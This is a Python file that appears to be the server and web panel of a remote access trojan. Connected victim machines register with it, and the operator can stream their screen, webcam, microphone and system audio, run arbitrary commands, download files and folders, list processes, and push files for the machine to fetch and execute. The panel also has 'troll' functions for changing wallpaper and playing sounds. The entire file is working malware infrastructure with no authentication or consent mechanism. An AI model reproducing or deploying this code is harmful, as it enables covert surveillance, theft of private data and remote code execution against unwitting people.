
import asyncio
import json
import struct
import time
import os
import io
import base64
from datetime import datetime
from pathlib import Path
from threading import Thread, Lock
from typing import Dict, Optional
from collections import defaultdict

from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS

TCP_HOST = '0.0.0.0'
TCP_PORT = 20169
WEB_PORT = 80

UPLOAD_FOLDER = Path('uploads')
UPLOAD_FOLDER.mkdir(exist_ok=True)

app = Flask(__name__, 
            static_folder='static',
            static_url_path='/static',
            template_folder='templates')
app.config['SECRET_KEY'] = 'remote_access_secret_2024'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=50 * 1024 * 1024)

clients: Dict[str, Dict] = {}
clients_lock = Lock()

print("[INIT] Server starting...")

class ClientConnection:
    
    def __init__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, addr):
        self.reader = reader
        self.writer = writer
        self.addr = addr
        self.client_id: Optional[str] = None
        self.running = True
        
    async def send_message(self, data: dict):
        try:
            json_str = json.dumps(data, ensure_ascii=False)
            json_bytes = json_str.encode('utf-8')
            length_bytes = struct.pack('>I', len(json_bytes))
            
            self.writer.write(length_bytes + json_bytes)
            await self.writer.drain()
            return True
        except Exception as e:
            print(f"[TCP] Error sending to {self.client_id}: {e}")
            return False
            
    async def read_message(self) -> Optional[dict]:
        try:
            length_bytes = await self.reader.readexactly(4)
            if not length_bytes:
                return None
                
            message_length = struct.unpack('>I', length_bytes)[0]
            json_bytes = await self.reader.readexactly(message_length)
            json_str = json_bytes.decode('utf-8')
            return json.loads(json_str)
            
        except asyncio.IncompleteReadError:
            return None
        except Exception as e:
            print(f"[TCP] Error reading from {self.client_id}: {e}")
            return None
            
    async def handle(self):
        print(f"[TCP] New connection from {self.addr}")
        
        try:
            while self.running:
                message = await self.read_message()
                
                if message is None:
                    break
                    
                action = message.get('action')
                msg_type = message.get('type')
                
                if action == 'register':
                    await self.handle_registration(message)
                    
                elif msg_type == 'heartbeat':
                    await self.handle_heartbeat()
                    
                elif msg_type == 'screen':
                    await self.handle_screen_data(message)
                    
                elif msg_type == 'camera':
                    await self.handle_camera_data(message)
                    
                elif msg_type == 'audio' or msg_type == 'pcm_audio':
                    await self.handle_audio_data(message)
                    
                elif msg_type == 'system_audio' or msg_type == 'pcm_system_audio':
                    await self.handle_system_audio_data(message)
                    
                elif msg_type == 'file_list_response':
                    await self.handle_file_list(message)
                    
                elif msg_type == 'file_download_response':
                    await self.handle_file_data(message)
                    
                elif msg_type == 'folder_download_response':
                    await self.handle_folder_data(message)
                    
                elif msg_type == 'process_list_response':
                    await self.handle_process_list(message)
                    
        except Exception as e:
            print(f"[TCP] Error handling {self.client_id}: {e}")
            
        finally:
            await self.disconnect()
            
    async def handle_registration(self, message: dict):
        self.client_id = message.get('client_id')
        full_info = message.get('full_info', {})
        device_info = message.get('device_info', '')
        
        print(f"[TCP] Client registered: {self.client_id}")
        print(f"      User: {full_info.get('user')}")
        print(f"      System: {full_info.get('system')}")
        print(f"      IP: {full_info.get('ip_address')}")
        
        with clients_lock:
            clients[self.client_id] = {
                'connection': self,
                'full_info': full_info,
                'device_info': device_info,
                'last_seen': time.time(),
                'online': True,
                'cached_data': {}
            }
            
        try:
            socketio.emit('new_client_connected', {
                'client_id': self.client_id,
                'user': full_info.get('user'),
                'device_info': full_info.get('system')
            })
            print(f"[SOCKETIO] Emitted new_client_connected for {self.client_id}")
        except Exception as e:
            print(f"[SOCKETIO] Error emitting: {e}")
        
    async def handle_heartbeat(self):
        if self.client_id:
            with clients_lock:
                if self.client_id in clients:
                    clients[self.client_id]['last_seen'] = time.time()
                    clients[self.client_id]['online'] = True
                    
    async def handle_screen_data(self, message: dict):
        if not self.client_id:
            return
            
        screen_data = message.get('data')
        
        with clients_lock:
            if self.client_id in clients:
                clients[self.client_id]['cached_data']['screen'] = screen_data
                
        socketio.emit('screen_chunk', {
            'client_id': self.client_id,
            'data': screen_data
        })
        
    async def handle_camera_data(self, message: dict):
        if not self.client_id:
            return
            
        camera_data = message.get('data')
        
        with clients_lock:
            if self.client_id in clients:
                clients[self.client_id]['cached_data']['camera'] = camera_data
                
        socketio.emit('camera_chunk', {
            'client_id': self.client_id,
            'data': camera_data
        })
        
    async def handle_audio_data(self, message: dict):
        if not self.client_id:
            return
            
        socketio.emit('pcm_audio', {
            'client_id': self.client_id,
            'data': message.get('data'),
            'format': message.get('format', {})
        })
        
    async def handle_system_audio_data(self, message: dict):
        if not self.client_id:
            return
            
        socketio.emit('pcm_system_audio', {
            'client_id': self.client_id,
            'data': message.get('data'),
            'format': message.get('format', {})
        })
        
    async def handle_file_list(self, message: dict):
        if not self.client_id:
            return
            
        with clients_lock:
            if self.client_id in clients:
                clients[self.client_id]['cached_data']['file_list'] = message.get('data', [])
                
    async def handle_file_data(self, message: dict):
        if not self.client_id:
            return
            
        with clients_lock:
            if self.client_id in clients:
                clients[self.client_id]['cached_data']['file_download'] = message.get('data')
                
    async def handle_folder_data(self, message: dict):
        if not self.client_id:
            return
            
        with clients_lock:
            if self.client_id in clients:
                clients[self.client_id]['cached_data']['folder_download'] = message.get('data')
                
    async def handle_process_list(self, message: dict):
        if not self.client_id:
            return
            
        with clients_lock:
            if self.client_id in clients:
                clients[self.client_id]['cached_data']['process_list'] = message.get('data', [])
                
    async def disconnect(self):
        self.running = False
        
        if self.client_id:
            print(f"[TCP] Client disconnected: {self.client_id}")
            
            with clients_lock:
                if self.client_id in clients:
                    clients[self.client_id]['online'] = False
                    clients[self.client_id]['connection'] = None
                    
        try:
            self.writer.close()
            await self.writer.wait_closed()
        except:
            pass


async def handle_tcp_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    addr = writer.get_extra_info('peername')
    client = ClientConnection(reader, writer, addr)
    await client.handle()


async def start_tcp_server():
    server = await asyncio.start_server(handle_tcp_client, TCP_HOST, TCP_PORT)
    addrs = ', '.join(str(sock.getsockname()) for sock in server.sockets)
    print(f'[TCP] Server listening on {addrs}')
    
    async with server:
        await server.serve_forever()


def run_tcp_server():
    try:
        asyncio.run(start_tcp_server())
    except KeyboardInterrupt:
        print("[TCP] Server stopped")


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/clients', methods=['GET'])
def get_clients():
    with clients_lock:
        clients_data = {}
        for client_id, data in clients.items():
            clients_data[client_id] = {
                'online': data['online'],
                'last_seen': data['last_seen'],
                'device_info': data.get('device_info', ''),
                'full_info': data['full_info']
            }
    
    print(f"[API] /api/clients called, returning {len(clients_data)} clients")
    return jsonify({'clients': clients_data})


@app.route('/api/clients/<client_id>', methods=['DELETE'])
def delete_client(client_id):
    with clients_lock:
        if client_id in clients:
            if clients[client_id].get('connection'):
                try:
                    asyncio.run(clients[client_id]['connection'].disconnect())
                except:
                    pass
            del clients[client_id]
            print(f"[API] Deleted client {client_id}")
            return jsonify({'success': True})
    return jsonify({'error': 'Client not found'}), 404


@app.route('/send_command', methods=['POST'])
def send_command():
    target = request.form.get('target')
    command = request.form.get('command')
    
    print(f"[API] /send_command called: target={target}, command={command}")
    
    if not target or not command:
        return jsonify({'error': 'Missing parameters'}), 400
        
    with clients_lock:
        if target not in clients:
            return jsonify({'error': 'Client not found'}), 404
            
        connection = clients[target]['connection']
        if not connection or not clients[target]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
    async def send_async():
        await connection.send_message({'type': 'command', 'payload': command})
        
    try:
        asyncio.run(send_async())
        print(f"[API] Command sent successfully to {target}")
        return jsonify({'success': True})
    except Exception as e:
        print(f"[API] Error sending command: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/statistics', methods=['GET'])
def get_statistics():
    with clients_lock:
        online = sum(1 for c in clients.values() if c['online'])
        total = len(clients)
        offline = total - online
        
        os_dist = defaultdict(int)
        device_dist = defaultdict(int)
        country_markers = defaultdict(int)
        
        for client in clients.values():
            info = client['full_info']
            
            system = info.get('system', 'Unknown')
            if 'Windows' in system:
                os_dist['Windows'] += 1
            elif 'Linux' in system:
                os_dist['Linux'] += 1
            elif 'Mac' in system:
                os_dist['macOS'] += 1
            else:
                os_dist['Other'] += 1
                
            device_type = info.get('device_type', 'Desktop')
            device_dist[device_type] += 1
            
            language = info.get('language', '')
            if '-' in language:
                country_code = language.split('-')[-1].upper()
                country_markers[country_code] += 1
                
    LOCALE_TO_COUNTRY = {
        'US': 'USA', 'GB': 'United Kingdom', 'DE': 'Germany', 'FR': 'France',
        'RU': 'Russia', 'CN': 'China', 'JP': 'Japan', 'BR': 'Brazil',
    }
    
    country_dist = {LOCALE_TO_COUNTRY.get(code, code): count for code, count in country_markers.items()}
                
    return jsonify({
        'online_devices': online,
        'offline_devices': offline,
        'total_devices': total,
        'os_distribution': dict(os_dist),
        'device_type_distribution': dict(device_dist),
        'country_distribution': country_dist,
        'country_markers': dict(country_markers)
    })


@app.route('/api/filemanager/list/<client_id>', methods=['GET'])
def filemanager_list(client_id):
    path = request.args.get('path', '')
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
            
        connection = clients[client_id]['connection']
        if not connection or not clients[client_id]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
        clients[client_id]['cached_data']['file_list'] = None
        
    async def get_files():
        await connection.send_message({'type': 'command', 'payload': f'filemanager:list:{path}'})
        
        for _ in range(50):
            await asyncio.sleep(0.1)
            with clients_lock:
                if client_id in clients and clients[client_id]['cached_data'].get('file_list') is not None:
                    return clients[client_id]['cached_data']['file_list']
                    
        return None
        
    files = asyncio.run(get_files())
    
    if files is not None:
        return jsonify(files)
    else:
        return jsonify({'error': 'Timeout'}), 408


@app.route('/api/filemanager/download/<client_id>', methods=['GET'])
def filemanager_download(client_id):
    path = request.args.get('path', '')
    
    if not path:
        return jsonify({'error': 'Path required'}), 400
        
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
            
        connection = clients[client_id]['connection']
        if not connection or not clients[client_id]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
        clients[client_id]['cached_data']['file_download'] = None
        
    async def get_file():
        await connection.send_message({'type': 'command', 'payload': f'filemanager:download:{path}'})
        
        for _ in range(300):
            await asyncio.sleep(0.1)
            with clients_lock:
                if client_id in clients and clients[client_id]['cached_data'].get('file_download'):
                    return clients[client_id]['cached_data']['file_download']
                    
        return None
        
    file_data = asyncio.run(get_file())
    
    if file_data:
        file_bytes = base64.b64decode(file_data['content_base64'])
        filename = file_data.get('filename', 'download')
        
        return send_file(
            io.BytesIO(file_bytes),
            as_attachment=True,
            download_name=filename,
            mimetype='application/octet-stream'
        )
    else:
        return jsonify({'error': 'Timeout'}), 408


@app.route('/api/filemanager/download_folder/<client_id>', methods=['GET'])
def filemanager_download_folder(client_id):
    path = request.args.get('path', '')
    
    if not path:
        return jsonify({'error': 'Path required'}), 400
        
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
            
        connection = clients[client_id]['connection']
        if not connection or not clients[client_id]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
        clients[client_id]['cached_data']['folder_download'] = None
        
    async def get_folder():
        await connection.send_message({'type': 'command', 'payload': f'filemanager:download_folder:{path}'})
        
        for _ in range(600):
            await asyncio.sleep(0.1)
            with clients_lock:
                if client_id in clients and clients[client_id]['cached_data'].get('folder_download'):
                    return clients[client_id]['cached_data']['folder_download']
                    
        return None
        
    folder_data = asyncio.run(get_folder())
    
    if folder_data:
        zip_bytes = base64.b64decode(folder_data['content_base64'])
        filename = folder_data.get('filename', 'folder.zip')
        
        return send_file(
            io.BytesIO(zip_bytes),
            as_attachment=True,
            download_name=filename,
            mimetype='application/zip'
        )
    else:
        return jsonify({'error': 'Timeout'}), 408


@app.route('/api/processes/list/<client_id>', methods=['GET'])
def processes_list(client_id):
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
            
        connection = clients[client_id]['connection']
        if not connection or not clients[client_id]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
        clients[client_id]['cached_data']['process_list'] = None
        
    async def get_processes():
        await connection.send_message({'type': 'command', 'payload': 'processes:list'})
        
        for _ in range(50):
            await asyncio.sleep(0.1)
            with clients_lock:
                if client_id in clients and clients[client_id]['cached_data'].get('process_list'):
                    return clients[client_id]['cached_data']['process_list']
                    
        return None
        
    processes = asyncio.run(get_processes())
    
    if processes is not None:
        return jsonify(processes)
    else:
        return jsonify({'error': 'Timeout'}), 408


@app.route('/api/upload_and_execute', methods=['POST'])
def upload_and_execute():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
        
    file = request.files['file']
    target = request.form.get('target')
    
    if not target:
        return jsonify({'error': 'No target specified'}), 400
        
    filename = file.filename
    filepath = UPLOAD_FOLDER / filename
    file.save(str(filepath))
    
    server_host = request.host.split(':')[0]
    file_url = f'http://{server_host}:{WEB_PORT}/uploads/{filename}'
    
    with clients_lock:
        if target not in clients:
            return jsonify({'error': 'Client not found'}), 404
            
        connection = clients[target]['connection']
        if not connection or not clients[target]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
    async def send_file():
        await connection.send_message({
            'type': 'command',
            'payload': f'execute:{file_url}'
        })
        
    asyncio.run(send_file())
    
    return jsonify({'success': True, 'filename': filename})


@app.route('/uploads/<filename>')
def serve_upload(filename):
    filepath = UPLOAD_FOLDER / filename
    if filepath.exists():
        return send_file(str(filepath))
    return jsonify({'error': 'File not found'}), 404


@app.route('/api/troll/wallpaper', methods=['POST'])
def troll_wallpaper():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
        
    file = request.files['file']
    target = request.form.get('target')
    
    if not target:
        return jsonify({'error': 'No target specified'}), 400
    
    filename = file.filename
    filepath = UPLOAD_FOLDER / filename
    file.save(str(filepath))
    
    server_host = request.host.split(':')[0]
    file_url = f'http://{server_host}:{WEB_PORT}/uploads/{filename}'
        
    with clients_lock:
        if target not in clients or not clients[target]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
        connection = clients[target]['connection']
        
    async def send_wallpaper():
        await connection.send_message({
            'type': 'command',
            'payload': f'troll:wallpaper:{file_url}'
        })
        
    asyncio.run(send_wallpaper())
    
    return jsonify({'success': True})


@app.route('/api/troll/sound', methods=['POST'])
def troll_sound():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
        
    file = request.files['file']
    target = request.form.get('target')
    
    if not target:
        return jsonify({'error': 'No target specified'}), 400
    
    filename = file.filename
    filepath = UPLOAD_FOLDER / filename
    file.save(str(filepath))
    
    server_host = request.host.split(':')[0]
    file_url = f'http://{server_host}:{WEB_PORT}/uploads/{filename}'
        
    with clients_lock:
        if target not in clients or not clients[target]['online']:
            return jsonify({'error': 'Client offline'}), 503
            
        connection = clients[target]['connection']
        
    async def send_sound():
        await connection.send_message({
            'type': 'command',
            'payload': f'troll:play_sound:{file_url}'
        })
        
    asyncio.run(send_sound())
    
    return jsonify({'success': True})


def main():
    print("=" * 60)
    print("  REMOTE ACCESS SERVER")
    print("=" * 60)
    print(f"  TCP Server: {TCP_HOST}:{TCP_PORT}")
    print(f"  Web Panel: http://0.0.0.0:{WEB_PORT}")
    print("=" * 60)
    
    tcp_thread = Thread(target=run_tcp_server, daemon=True)
    tcp_thread.start()
    
    try:
        socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False, allow_unsafe_werkzeug=True)
    except Exception as e:
        print(f"[ERROR] Failed to start web server: {e}")


if __name__ == '__main__':
    main()

